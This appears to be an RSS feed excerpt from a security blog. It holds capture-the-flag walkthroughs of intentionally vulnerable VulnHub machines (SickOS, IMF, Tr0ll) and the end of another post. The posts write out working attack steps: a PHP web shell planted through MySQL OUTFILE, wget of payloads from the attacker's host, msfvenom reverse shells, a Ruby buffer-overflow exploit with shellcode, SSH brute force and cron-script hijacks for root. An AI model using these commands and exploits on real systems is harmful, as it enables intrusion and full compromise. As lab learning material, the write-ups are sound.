<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; mysql -h vm -u root -p wordpress

mysql&gt;&gt; SELECT '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' INTO OUTFILE '/root/www/rce.php'
</code></pre><p><img src="https://i.imgur.com/h0gsLrZ.png" alt=""></p>
<p>With remote code execution enabled, an attacker can download a malicious payload that initiates a reverse
shell.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint"># start a web server to host the payload
&gt;&gt; systemctl start apache2

#create the payload in the web directory
&gt;&gt; msfvenom -p php/meterpreter_reverse_tcp LPORT=443 LHOST=$HOST_IP -t raw &gt; /var/www/html/qq.php

# trigger remote commands that download the payload from the attacker's computer
&gt;&gt; curl &quot;vm/rce.php?cmd=wget 192.168.110.101/qq.php&quot;
&gt;&gt; curl &quot;vm/rce.php?cmd=ls&quot;
</code></pre><p><img src="https://i.imgur.com/5WdoFhk.png" alt=""></p>
<p>A listener/handler is configured and the reverse shell kicked off on the victim computer</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; msfconsole -x &quot;use exploit/multi/handler&quot;

msfconsole&gt;&gt; set PAYLOAD php/meterpreter_reverse_tcp
msfconsolemsfconsole&gt;&gt; set LPORT 443
msfconsole&gt;&gt; exploit -j

# start the shell
&gt;&gt; curl &quot;vm/qq.php&quot;
</code></pre><p><img src="https://i.imgur.com/Gxqwui2.png" alt=""></p>
<p>An attacker can now enumerate the contents of the victim&rsquo;s file system, allowing them identify any vulnerable
or mis-configured services that would allow them to elevate privileges. In this case, a cron script was
running a world-modifiable file as root.</p>
<p><img src="https://i.imgur.com/I0kuii9.png" alt="">
<img src="https://i.imgur.com/bg9dpXH.png" alt=""></p>
<p>Further inspection of this scheduled task:</p>
<p><img src="https://i.imgur.com/WXEowHC.png" alt=""></p>
<p>This task runs as the root user. All that was needed to become root was to replace the contents of the script
with a reverse shell.</p>
<p><img src="https://i.imgur.com/vFqTefn.png" alt=""></p>
<h2 id="additional-discovery">Additional Discovery</h2>
<p>SMB enumeration and unprotected shares revealed some employee names and personal notes
<img src="https://i.imgur.com/VEFkW99.png" alt=""></p>
<p>Port 666 was serving a zip file of a screenshot of another personal note. The exif contained some notes for
the attacker.
<img src="https://i.imgur.com/vJBqGGF.png" alt=""></p>
<p>The anonymous ftp login also leaks information.
<img src="https://i.imgur.com/fW3Nl8k.png" alt="">
<img src="https://i.imgur.com/aFFIp9P.png" alt=""></p>
<p>Port 80 scan initially returned what looked like a user&rsquo;s dotfiles. This gave me the idea that someone may be
running a web server from their home directory.
<img src="https://i.imgur.com/w3143f7.png" alt=""></p>
<p>The Wordpress site could have been used as another vector for a shell by adding a reverse shell plug-in. The
users and passwords were crackable with the rockyou word list. Some users also reused their Wordpress
passwords for their machine accounts.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">&gt;&gt; wpscan -u https://vm:12380/blogblog/ --enumerate u
</code></pre><p><img src="https://i.imgur.com/v1GKKbb.png" alt=""></p>
<p>Without accessing the computer&rsquo;s <code>/etc/passwd</code> file, this gathering of information revealed the existence of
the following employees and a accounts:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">barry
dave
elly
fred
garry
harry
heather
john
kathy
pam
peter
scott
tim
vicki
zoe
</code></pre>]]></content>
        </item>
        
        <item>
            <title>B2R: SickOSv1.2</title>
            <link>https://ctrl.red/posts/2016/12/b2r-sickosv1.2/</link>
            <pubDate>Tue, 20 Dec 2016 23:45:50 -0500</pubDate>
            
            <guid>https://ctrl.red/posts/2016/12/b2r-sickosv1.2/</guid>
            <description>Executive Summary This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to explore the system for additional vulnerabilities which could lead to a full compromise. During the exploration, an outdated version of chkrootkit was found. By exploiting a known vulnerability in the way chkrootkit parses arguments, an attacker could create a malicious file that would later be run by chkrootkit as a fully privileged user.</description>
            <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
<p>This machine had an unprotected folder which allowed uploading of malicious PHP code which could then be
executed remotely. An attacker could then create an unprivileged shell on the victim machine and begin to
explore the system for additional vulnerabilities which could lead to a full compromise. During the
exploration, an outdated version of <code>chkrootkit</code> was found. By exploiting a known vulnerability in the way
<code>chkrootkit</code> parses arguments, an attacker could create a malicious file that would later be run by
<code>chkrootkit</code> as a fully privileged user.</p>
<h2 id="tools-used">Tools used</h2>
<ul>
<li>nmap - discovery</li>
<li>uniscan - web application scanner</li>
<li>metasploit - exploit framework</li>
<li>msfvenom - payload generation</li>
<li>local-linux-enum script - enumeration</li>
</ul>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>In order to cut down on typing, once the IP of the victim computer is discovered, it can be added to the
<code>/etc/hosts</code>.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.188 vm&quot; &gt;&gt; /etc/hosts
</code></pre><p>We begin with scanning the victim&rsquo;s machine and find ports 80 and 22.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ nmap -p - -A vm | tee nmap.scan
</code></pre><p><img src="https://i.imgur.com/jQr872J.png" alt=""></p>
<p>Navigating to the page and checking its source code reveals nothing</p>
<p><img src="https://i.imgur.com/1Oigcfa.png" alt=""></p>
<p>Running <code>uniscan</code>, a folder named <code>test</code> is discovered</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ uniscan -qweds -u http://vm/ 
</code></pre><p><img src="https://i.imgur.com/wU5Wp2v.png" alt=""></p>
<p>The listing appeared to be empty but further examination of the <code>/test</code> path revealed that it responded to
more than just HTTP methods. <code>COPY</code> and <code>MOVE</code> seemed to indicate WebDAV.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">❯❯ curl -vX OPTIONS vm/test
</code></pre><p><img src="https://i.imgur.com/6GKZJbc.png" alt=""></p>
<p>This path requires no authentication and thus allows attackers to upload files to the web server.</p>
<p><img src="https://i.imgur.com/gSzuoHZ.png" alt=""></p>
<p>Verifying successful upload:</p>
<p><img src="https://i.imgur.com/CpTqKyO.png" alt=""></p>
<p>Having uploaded the reverse shell, the Meterpreter handler is constructed</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 80
run -j
</code></pre><p>&hellip;and the payload is activated.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">curl http://vm/test/sshhh.php
</code></pre><p><img src="https://i.imgur.com/XQ3a9Q4.png" alt=""></p>
<p>Once a shell has been established on the system, an enumeration script reveals what additional
vulnerabilities might lead to a full compromise.</p>
<p>The installed version of <code>chkrootkit</code> is outdated and vulnerable to a code execution exploit.</p>
<p><img src="https://i.imgur.com/EJSijYp.png" alt=""></p>
<p>The ExploitDB gives the following description:</p>
<p><img src="https://i.imgur.com/uVIlbic.png" alt=""></p>
<p>Using Metasploit, we create another handler and payload, using the <code>chkrootkit</code> module. This module will
create/overwrite the <code>/tmp/update</code> file with the reverse tcp shell of your choosing. The next time
<code>chkrootkit</code> is run, this update file will connect back to the attacker computer designated in the payload.</p>
<p><img src="https://i.imgur.com/9GKQfrW.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>B2R: IMF Walkthrough</title>
            <link>https://ctrl.red/posts/2016/11/b2r-imf-walkthrough/</link>
            <pubDate>Tue, 01 Nov 2016 19:16:02 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2016/11/b2r-imf-walkthrough/</guid>
            <description>After mapping the network and finding our IP address at 192.168.1.162, we can add it to our /etc/hosts temporarily to make things a little easier for us.
echo &amp;quot;192.168.1.162 imf&amp;quot; &amp;gt;&amp;gt; /etc/hosts Lets see what kind of machine we&amp;rsquo;re dealing with.
Ok, so web only. Great. nikto didn&amp;rsquo;t reveal any low-hanging fruit so let&amp;rsquo;s dive into the source.
Check that out! Our first flag was hidden in http://imf/contact.php. This looks like base64.</description>
            <content type="html"><![CDATA[<p>After mapping the network and finding our IP address at <code>192.168.1.162</code>, we can add it to our <code>/etc/hosts</code>
temporarily to make things a little easier for us.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">echo &quot;192.168.1.162     imf&quot; &gt;&gt; /etc/hosts
</code></pre><p>Lets see what kind of machine we&rsquo;re dealing with.</p>
<p><img src="https://i.imgur.com/1DmhXnq.png" alt=""></p>
<p>Ok, so web only. Great. <code>nikto</code> didn&rsquo;t reveal any low-hanging fruit so let&rsquo;s dive into the source.</p>
<p><img src="https://i.imgur.com/S4hPuB2.png" alt=""></p>
<p>Check that out! Our first flag was hidden in <code>http://imf/contact.php</code>. This looks like base64. After decoding
we get the clue <code>allthefiles</code>. Lets keep looking.</p>
<p>Going back to the source code, I found a javascript file that also looked like it was base64 but it didn&rsquo;t
return any results. After a while of going in circles I took my dog for a walk and pondered about what
&lsquo;allthefiles&rsquo; could mean. When I came back and looked over the source code again, I saw this:</p>
<p><img src="https://i.imgur.com/ANZ1UgC.png" alt=""></p>
<p>All the files, ey?</p>
<p><img src="https://i.imgur.com/Ik1rUga.png" alt=""></p>
<p>If we visit that directory on our webapp</p>
<p><img src="https://i.imgur.com/75xqVVJ.png" alt=""></p>
<p>Ok, no DB here. We&rsquo;re dealing with a hardcoded password which means we&rsquo;re dealing with an equaltiy operator
on the backend or possibly the <code>strcmp()</code> function. I messed around with nullbyte string termination exploits
here for a while but ultimately ended up nowhere. Let&rsquo;s assume we&rsquo;re dealing with <code>strcmp</code> since it&rsquo;s easier
to fool a function than to fool an operator.</p>
<p><img src="https://i.imgur.com/qo8t92C.png" alt=""></p>
<p>I&rsquo;m not very good with PHP, but I&rsquo;m guessing that I need this function to return a <code>0</code> so I fired up
<a href="https://repl.it">repl.it</a> and started trying to break it. Turns out if you feed it the wrong type (it
expects two strings), it seems to return a <code>0</code>.</p>
<p><img src="https://i.imgur.com/iQiFPrC.png" alt=""></p>
<p>So if we can feed this function an array from the web form, we might be able to bypass the password check. By
changing the name of the form&rsquo;s password field from <code>pass</code> to <code>pass[]</code>, we can do just that.</p>
<p><img src="https://i.imgur.com/DpxX4o7.png" alt=""></p>
<p>With the modified form, a BS password, and a username from the Contacts page, we get&hellip;</p>
<p><img src="https://i.imgur.com/wB0UUP3.png" alt=""></p>
<p>The decoded flag just has us click through to the CMS</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms
</code></pre><p>The CMS has 3 pages to choose from and none of them seemed to have any relevant info. I tried (too long) to
use LFI exploits here, modifying URLs, headers, HTTP methods&hellip; nothing. I was trying to enter an empty
<code>pagename</code> for like the 100th time when I fat fingered the &ldquo;enter&rdquo; key and hit <code>' + Enter</code> at the same time
when I saw this:</p>
<p><img src="https://i.imgur.com/Oqo4ZQg.png" alt=""></p>
<p>SQL! Alright, fired up <code>sqlmap</code></p>
<p><img src="https://i.imgur.com/izezAtP.png" alt="">
<img src="https://i.imgur.com/uckNUTe.png" alt=""></p>
<p>Looks like we have an image at <code>imfadministrator/images/whiteboard.jpg</code></p>
<p><img src="https://i.imgur.com/BBLfAQY.png" alt=""></p>
<p>The QR Code is our next flag <code>flag4{dXBsb2FkcjkOMi5waHA=}</code></p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">root@kali:~                                                                                                                                                                                     ⍉
❯❯ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d
uploadr942.php   
</code></pre><p>We navigate to <code>http://imf/imfadministrator/uploadr942.php</code> and we get our uploader. After messing around
with it a bit we can see that the response html from a successful upload has a hash of some sort. I&rsquo;m
guessing its the hashed version of the filename in the <code>/uploads</code> folder.</p>
<p>Maybe we can craft a malicious image with a reverse_tcp meterpreter payload then insert the new page into our
db so it gets executed.</p>
<p><img src="https://i.imgur.com/y8obNV4.png" alt=""></p>
<p>Let&rsquo;s upload it!</p>
<p><img src="https://i.imgur.com/ePzjKU9.png" alt=""></p>
<p>Haha! Whoops. Alright what about just regular command execution:</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">cat &lt;&lt;EOF &gt; muahaha.gif
GIF89a
&lt;?php \`id\` ?&gt;
</code></pre><p>Since CrappyWAF detects functions calls, we should modify our script to take the command from a query
parameter. Let&rsquo;s replace <code>id</code> with <code>$cmd=$_GET['cmd']; echo $cmd</code> and try again.</p>
<p><img src="https://i.imgur.com/v0uaGPw.png" alt=""></p>
<p>Lets get a shell that&rsquo;s easier to work with with <code>msfvenom</code>.</p>
<p><img src="https://i.imgur.com/lXrjIik.png" alt="">
<img src="https://i.imgur.com/dRelPbw.png" alt=""></p>
<p>It&rsquo;s time to get a sense of the machine we&rsquo;re in. &ldquo;Presence&rdquo;</p>
<ul>
<li>interesting processes - knockd, sshd</li>
<li>interesting files (world readable, executable root files, etc) - <code>/usr/local/bin</code>
<ul>
<li><code>cat /usr/local/bin/access_codes #&gt; SYN 7482,8279,9467</code></li>
<li><code>/usr/local/bin/agent</code> - connect to some sort of agent portal; download it</li>
</ul>
</li>
<li>listening ports <code>netstat -plnt</code> - 7788</li>
</ul>
<p>It looks like we&rsquo;ve got a hidden service running on 7788. To enable it, we have to &lsquo;knock&rsquo; in the right order
so the firewalll opens up. If we send SYN packets to 7482 8279 9467, it might open up.</p>
<p><img src="https://i.imgur.com/SgDQYRk.png" alt="">
<img src="https://i.imgur.com/SdM3380.png" alt=""></p>
<p>Lets decompile our downloaded binary at <a href="https://retdec.com/decompilation-run/">https://retdec.com/decompilation-run/</a></p>
<p><img src="https://i.imgur.com/WnuLN8R.png" alt=""></p>
<p>We can see on line 49 where the authentication happens. It&rsquo;s comparing against a string that was defined on
line 37, <code>0x2ddd984</code>. If we pop this into an online hex converter, we get <code>48093572</code></p>
<p><img src="https://i.imgur.com/rs6S3Yf.png" alt=""></p>
<p>After navigating through our binary, we have a place where we have user input. This is looking like it&rsquo;s
going to be a buffer overflow exploit. Once we download our application and run it through <code>gdb</code>, we confirm
that the report function is vulnerable.</p>
<p><img src="https://i.imgur.com/4CxBLoX.png" alt="">
<img src="https://i.imgur.com/bD9RCyw.png" alt=""></p>
<p>Bingo. Plug 0x41366641 into <code>pattern_offset</code> we see that our buffer ends at 168, meaning our EIP register is
at 169. If we inspect the assembly for the <code>report</code> function, we see that our report string is stored in EAX.
Because we have control of both EIP and EAX, it makes sense that we use this control to point one to the
other. We can place our exploit at the beginning of EAX by simply injecting it as the &ldquo;report&rdquo;. We&rsquo;ll then
pad the input string until it&rsquo;s 168 characters long. Then, well tell EIP that it should return to the
beginning of EAX where our payload is waiting.  If we search to see if EAX is ever called, we can use that
address in EIP.</p>
<p><img src="https://i.imgur.com/R7BFi8b.png" alt="">
<img src="https://i.imgur.com/3yWsjBr.png" alt=""></p>
<p>Lets generate our shellcode and start to write the exploit.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.1.161 LPORT=4444 -f ruby -b &quot;\x00\x0a\x0d&quot;
</code></pre><pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">require 'socket'

host = '192.168.1.162'

if ARGV[0] == 'knock'
  [7482, 8279, 9467].each do |port|
    puts &quot;knocking on #{port}&quot;
    `nmap -Pn --host_timeout 201 --max-retries 0 -p #{port} #{host} &amp;&gt;/dev/null`
  end
end

buf = 
&quot;\xda\xd4\xd9\x74\x24\xf4\x58\xbb\xc8\x28\xf5\xc3\x29\xc9&quot; +
&quot;\xb1\x12\x31\x58\x1a\x83\xc0\x04\x03\x58\x16\xe2\x3d\x19&quot; +
&quot;\x2e\x34\x5e\x09\x93\xe8\xca\xac\xa3\x69\x83\x50\x0e\xf5&quot; +
&quot;\x04\xc9\xf9\x36\x82\xef\x58\xde\xd0\xef\x8b\x43\x5d\x0e&quot; +
&quot;\xc1\x1d\x05\x81\x47\xb5\x3c\xc0\x2b\xf4\xbe\xb1\xab\xbf&quot; +
&quot;\xbe\xa5\xb3\xbf\x37\x26\x72\x54\x4b\x68\x96\xa7\xe3\x17&quot; +
&quot;\x94\x38\x58\x61\xc7\xa0\xe8\x7d\xb8\xd0\xd9\xfe\x47\x37&quot;

eip = &quot;\x63\x85\x04\x08&quot;

exploit = buf + &quot;A&quot;*70 + eip

s = TCPSocket.new(host, 7788)
puts s.readpartial(512)
s.write(&quot;48093572\n&quot;)

puts s.readpartial(512)
s.write(&quot;3\n&quot;)

puts s.readpartial(512)
s.write(exploit + &quot;\n&quot;)
</code></pre><p>Let&rsquo;s run it!</p>
<p><img src="https://i.imgur.com/ImmvfQj.png" alt=""></p>
<p>And there we have it! Thanks for reading!</p>
]]></content>
        </item>
        
        <item>
            <title>B2R: Tr0ll Walkthrough</title>
            <link>https://ctrl.red/posts/2016/10/b2r-tr0ll-walkthrough/</link>
            <pubDate>Thu, 20 Oct 2016 20:57:00 -0400</pubDate>
            
            <guid>https://ctrl.red/posts/2016/10/b2r-tr0ll-walkthrough/</guid>
            <description>A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about vulnhub, a repository of intentionally vulnerable virtual machines for anyone to compromise. Since coming back, vulnhub has become my new obsession. Here&amp;rsquo;s a walkthrough of my attempt.
Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.
__
After finding the VM with an nmap scan, we see a couple of open ports.</description>
            <content type="html"><![CDATA[<p>A couple of weeks ago, work sent me to a security class for an upcoming product. While there, I learned about
<a href="https://vulnhub.com">vulnhub</a>, a repository of intentionally vulnerable virtual machines for anyone to
compromise. Since coming back, vulnhub has become my new obsession. Here&rsquo;s a walkthrough of my attempt.</p>
<p><em>Note: I struggled a bit more that this writeup lets on. The struggle is ommited for clarity and brevity.</em></p>
<p>__</p>
<p>After finding the VM with an nmap scan, we see a couple of open ports.</p>
<p><img src="images/Screenshot2016-10-2100:03:55.png" alt=""></p>
<p>Upon browsing to the web page, we&rsquo;re greeted with our good friend, the troll.</p>
<p><img src="images/Screenshot2016-10-2111:10:57.png" alt=""></p>
<p>With the CTFs I&rsquo;ve done so far, I&rsquo;ve run <code>nikto</code> or <code>uniscan</code>, to find useful information about the site.
There&rsquo;s almost always a <code>robots.txt</code> file. Let&rsquo;s start there.</p>
<p><img src="images/Screenshot2016-10-2111:15:06.png" alt=""></p>
<p>OK, so another troll face. Uniscan and Nikto brought up nothing either. I guess it&rsquo;s off to the FTP service
then.</p>
<p>I run <code>nmap -A</code> against the FTP port and see that I get a name and version number. Searchsploit doesn&rsquo;t turn
up anything useful so I try to log in as an anonymous user and bingo; next clue.</p>
<p><img src="images/Screenshot2016-10-2111:20:43.png" alt=""></p>
<p>Let&rsquo;s take a look at what&rsquo;s inside (superfluous <code>grep</code> added for display purposes)</p>
<p><img src="images/Screenshot2016-10-2111:44:15.png" alt=""></p>
<p>So we get the string &lsquo;sup3rs3cr3tdirlol&rsquo;. Navigating there gets a directory listing with one file. Let&rsquo;s
download it.</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">$&gt; curl -L 192.168.110.103/sup3rs3cr3tdirlol/roflmao
$&gt; file roflmao
# shows it's a binary file

$&gt; strings roflmao
# ..snip..
# Find address 0x0856BF to proceed
# ..snip..
</code></pre><p>During CTFs I usually append unique words I run into to a dictionary so I can either use them for brute force
attacks or for enumerating web directories with a tool like <code>dirbuster</code>. It wasn&rsquo;t very long at this point
and given the trolling nature of this challenge so far I thought maybe I should take our string&rsquo;s words
literally. That, and it wasn&rsquo;t a real memory address at only 3 bytes long.</p>
<p><img src="images/Screenshot2016-10-2112:04:00.png" alt=""></p>
<p>Awesome! I downloaded the files which had what looked like usernames and a single password. One folder was
called &lsquo;this_folder_contains_the_password&rsquo;. Again, taking things literally, I made a quick and dirty script
to take all the words in this folder and append them to my wordlist.</p>
<pre tabindex="0"><code class="language-ruby.prettyprint" data-lang="ruby.prettyprint">require 'nokogiri'
require 'open-uri'

url = 'http://192.168.110.103/0x0856BF/this_folder_contains_the_password'
data = open(url).read
page = Nokogiri::HTML(data)

def print_tree(node, list = [])
  return list if node.children.empty?
  node.children.inject(list) do |memo, child|
    text = child.text.split(&quot; &quot;).map(&amp;:strip) unless child.text.nil?
    memo.push(*text) if text
    print_tree(child, memo)
  end
end

puts print_tree(page).to_a.sort.uniq
</code></pre><pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">ruby scrape.rb &gt;&gt; word.list
</code></pre><p>This seemed like a good time to attack the ssh port with <code>hydra</code> and our new lists. After a couple of
attempts, the SSH port stopped letting me try to authenticate. I went through the attack again, reversing the
user list, password list, then both, waiting for the ssh port to reset between attempts. And then&hellip;</p>
<p><img src="images/Screenshot2016-10-2113:45:29.png" alt=""></p>
<p>Once we&rsquo;re logged in, we&rsquo;re immediately kicked off and we see the following message:</p>
<p><img src="images/Screenshot2016-10-2113:50:33.png" alt=""></p>
<p>OK, after a few more logons, I notice it happens every 5 minutes&hellip; cron job.</p>
<p>In the meantime, I uploaded an enumeration script to <code>/tmp</code>, but notice that it also gets deleted about every
2 minutes. Another cron job?</p>
<p>I tried to manually see if there were any SUID binaries to exploit or any world-writable files</p>
<pre tabindex="0"><code class="language-bash.prettyprint" data-lang="bash.prettyprint">find / --perm 6000
find / --perm 0777
</code></pre><p>There are! It&rsquo;s a long list but 1 stands out: <code>/lib/log/cleaner.py</code> The contents of the file looks
like it wipes the <code>/tmp</code> directory. This must be the file that <code>cron</code> runs.</p>
<p><img src="images/Screenshot2016-10-2113:54:51.png" alt=""></p>
<p>Thank goodness it&rsquo;s writable ;) I I start a meterpreter listener and replace the <code>cleaner.py</code> contents with a
stager.</p>
<p><img src="images/Screenshot2016-10-2114:03:47.png" alt=""></p>
<p>Since the owner of the <code>cleaner.py</code> file was root, and the meterpreter stager was now the contents of the
file&hellip;</p>
<p><img src="images/Screenshot2016-10-2114:04:41.png" alt=""></p>
<p>Now we can take a look at the cron jobs to see what was trolling us and also at the flag</p>
<p><img src="images/Screenshot2016-10-2114:11:12.png" alt=""></p>
<p>There we have it! This was so fun! CTF VMs have completely replaced video games for me.</p>
]]></content>
        </item>
        
    </channel>
</rss>
